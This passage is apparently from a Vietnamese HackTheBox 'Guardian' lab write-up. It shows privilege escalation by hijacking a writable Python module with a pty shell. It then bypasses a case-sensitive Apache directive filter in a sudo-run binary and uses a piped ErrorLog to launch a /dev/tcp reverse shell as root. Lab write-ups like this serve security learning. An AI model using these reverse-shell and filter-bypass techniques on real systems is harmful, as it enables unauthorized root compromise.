drwxr-sr-x 4 root admins 4096 Jul 10 13:53 ../
-rw-r----- 1 root admins  287 Apr 19  2025 attachments.py
-rw-r----- 1 root admins  246 Jul 10 14:20 db.py
-rw-r----- 1 root admins  226 Apr 19  2025 logs.py
-rwxrwx--- 1 mark admins  214 Nov 20 05:10 status.py*
```

File `status.py` có quyền ghi đối với group `admins`, tôi không thể ghi file này với user hiện tại nhưng hoàn toàn có thể thay thay thế 1 file cùng tên với nội dung khác.

```bash
echo 'import pty; pty.spawn("/bin/bash")' > status.py
```

```bash
jamil@guardian:~$ cp status.py /opt/scripts/utilities/utils/status.py
```

```bash
jamil@guardian:~$ cat /opt/scripts/utilities/utils/status.py 
import pty; pty.spawn("/bin/bash")
```

Chạy `utilities.py` với user `mark`, thêm option `system-status`

```bash
jamil@guardian:~$ sudo -u mark /opt/scripts/utilities/utilities.py system-status
mark@guardian:/home/jamil$ id
uid=1001(mark) gid=1001(mark) groups=1001(mark),1002(admins)
mark@guardian:/home/jamil$ 
```

### root

`sudo -l`

```bash
mark@guardian:~$ sudo -l
Matching Defaults entries for mark on guardian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on guardian:
    (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
```

Phân tích file `/usr/local/bin/safeapache2ctl`

```bash
mark@guardian:~$ file /usr/local/bin/safeapache2ctl
/usr/local/bin/safeapache2ctl: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0690ef286458863745e17e8a81cc550ced004b12, for GNU/Linux 3.2.0, not stripped
mark@guardian:~$ strings /usr/local/bin/safeapache2ctl
/lib64/ld-linux-x86-64.so.2
__cxa_finalize
fgets
................
PTE1
u+UH
</uMH
%31s %1023s
Include
IncludeOptional
LoadModule
/home/mark/confs/
[!] Blocked: %s is outside of %s
Usage: %s -f /home/mark/confs/file.conf
realpath
Access denied: config must be inside %s
fopen
Blocked: Config includes unsafe directive.
apache2ctl
/usr/sbin/apache2ctl
execl failed
:*3$"
GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
...............
```

Đây là một binary dùng để chạy `apache2ctl`. Thực sự là tôi không có nhiều kinh nghiệm với việc xử lý hay khai thác leo thang đặc quyền bằng cái file binary như thế này, nên một lần nữa phải nhờ đến sự giúp đỡ của anh bạn AI.

Dưới đây là tổng hợp kết quả phân tích tôi nhận được.

![](/assets/img/2025-11-12-HTB-Guardian/29.png)

Từ phần 3, filter này chỉ lọc những chuỗi xác định sẵn, trong khi Apache không phân biệt chữ hoa và chữ thường, nghĩa là tôi vẫn có thể nạp các module độc hại sử dụng chuỗi không viết hoa, ví dụ như thay `LoadModule` bằng `loadmodule`, mục tiêu là cố gắng chèn thêm payload vào file config và ép apache2 load file config mới này.

Sau rất nhiều lần cãi nhau với Claude, thử và lỗi, thì cuối cùng tôi đã thành công.

Đầu tiên tạo 1 revershell trong `/tmp`, mục tiêu là dùng file `.conf` để load shell này.

```bash
nano /tmp/shell.sh
```

```bash
#!/bin/bash
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.165/4444 0>&1'
```

Tạo file `.conf` trong thư mục `confs/`, vì `safeapache2ctl` chỉ load file trong thư mục này.

```bash
nano confs/exploit.conf
```

```bash
PidFile /tmp/evil.pid
Listen 8888
User mark
Group mark
ServerRoot /etc/apache2
include /etc/apache2/mods-enabled/*.load
ErrorLog "|/tmp/shell.sh"
```

- `PidFile /tmp/evil.pid`: Apache mặc định dùng file PID ở `/var/run/apache2/pid`. Khi một Apache khác đang chạy (service chính), file này bị khóa. Trỏ PidFile ra `/tmp/` (nơi ai cũng ghi được) và đặt tên khác đi. Điều này lừa Apache mới rằng "Chưa có ai chạy cả, mình được phép khởi động".
- `Listen 8888`: Service Apache chính đang chiếm dụng cổng 80. Hai tiến trình không thể lắng nghe cùng một cổng trên cùng một IP, nên đổi sang 1 cổng nào đó bất kỳ >1024.
- `User mark` / `Group mark`: Apache có cơ chế an toàn, nếu thấy mình được chạy bởi root, nó sẽ cố gắng chuyển quyền (drop privileges) sang user khác để xử lý request web. Nếu không khai báo User/Group, hoặc module xử lý user (`mod_unixd`) chưa load, Apache sẽ panic và không khởi động.
- `include /etc/apache2/mods-enabled/*.load`: Khi dùng `-f`, Apache chạy "trần trụi", không load bất kỳ module nào (kể cả module quan trọng nhất là MPM để quản lý process). Nếu thiếu MPM, Apache chết ngay lập tức (lỗi `No MPM loaded`). Việc đoán tên từng file `.so` rất dễ sai. Thay vì đoán thì load tất cả những gì hệ thống đang dùng. Sử dụng từ khóa **`include` (viết thường)** để bypass được filter trong binary.
- `ErrorLog "|/bin/bash /tmp/shell.sh"`: Chỉ thị `ErrorLog` của Apache cho phép ghi log vào file HOẶC gửi log vào một chương trình khác thông qua pipe (`|`). Chương trình trong pipe được khởi tạo bởi **Parent Process** của Apache. Vì `safeapache2ctl` chạy SUID Root -> Parent Process là Root -> Chương trình trong pipe (`bash`) chạy dưới quyền **Root**.

Bật listener với port 4444

```bash
penelope -p 4444
```

Load config mới vừa tạo

```bash
sudo /usr/local/bin/safeapache2ctl -f confs/exploit.conf
```

```bash
mark@guardian:~$ sudo /usr/local/bin/safeapache2ctl -f confs/exploit.conf
AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 10.10.11.84. Set the 'ServerName' directive globally to suppress this message
Action '-f /home/mark/confs/exploit.conf' failed.
The Apache error log may have more information.
```

Quay trở lại listener

```bash
┌──(kali㉿kali)-[~/htb/machines/Guardian]
└─$ penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.232.128 • 172.20.0.1 • 172.17.0.1 • 172.19.0.1 • 172.18.0.1 • 10.10.14.165
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from guardian~10.10.11.84-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/guardian~10.10.11.84-Linux-x86_64/2025_11_20-09_39_16-468.log 📜
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@guardian:/etc/apache2# id
uid=0(root) gid=0(root) groups=0(root)
root@guardian:/etc/apache2# cd
bash: cd: HOME not set
root@guardian:/etc/apache2# cd /root
root@guardian:/root# ls
root.txt  scripts
root@guardian:/root# 
```